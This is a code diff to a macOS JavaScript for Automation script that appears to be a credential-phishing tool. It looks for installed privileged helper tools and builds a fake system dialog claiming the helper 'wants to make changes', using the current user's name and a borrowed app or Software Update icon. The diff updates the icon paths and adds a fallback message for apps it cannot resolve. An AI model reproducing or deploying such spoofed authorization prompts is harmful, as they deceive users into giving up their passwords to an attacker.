@@ -13,7 +13,6 @@ function listDirectory(strPath) {
             .map(ObjC.unwrap);
     }
 var output = "";
- 
 
 var PrivilegedHelperExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath('/Library/PrivilegedHelperTools')
 				 if (PrivilegedHelperExistsCheck == true) {
@@ -44,7 +43,7 @@ var splitFileOutput = fixedFileOutput.split("\n")
  }
 
 var defaultIconName = "AppIcon"
-var defaultIconStr = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns"
+var defaultIconStr = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
 var resourcesFolder = "/Contents/Resources"
 var iconExt = ".icns"
 var makeChanges = " wants to make changes."
@@ -54,10 +53,15 @@ var userName = currentApp.systemInfo().shortUserName;
 var hlprName = cleanFullPaths[0].replace(/['"]+/g, '').trim()
 var text = hlprName + makeChanges + "\n" + privString + userName + allowThis
 var title = $.NSWorkspace.sharedWorkspace.URLForApplicationWithBundleIdentifier(hlprName).fileSystemRepresentation + '';
+var wonkyApp = title.toString()
+if (wonkyApp == "undefined" ){
+	var iconNameString = "noicon"
+	var appName = "Application is Unable to Continue" + "\n" + "Please Close the Application" 
+	}else {
 var appName = title.split('/').slice(-1)
 
 var iconFolder = title + "/Contents/Resources/"
-var enumerateIconfolder = listDirectory(iconFolder)
+var enumerateIconfolder = listDirectory(iconFolder) 
 var iconName =
 enumerateIconfolder.filter(function(file){
    return file.indexOf(iconExt) !== -1;
@@ -65,9 +69,10 @@ enumerateIconfolder.filter(function(file){
 });
 
 var iconNameString = iconName.toString()
+} 
 if (iconNameString.includes('icns') == true ){
 	var icon = iconFolder + iconName[0]
-} else {var icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns"
+} else {var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
 }
 
 var prompt = currentApp.displayDialog(text, {
@@ -100,7 +105,7 @@ if (promptResults == ""){
 
 } else {
 var config = [];
-var icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns";
+var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
     var title = "An Application Needs an Update to Continue";
     var text = "An Application Needs an Update to Continue";
 
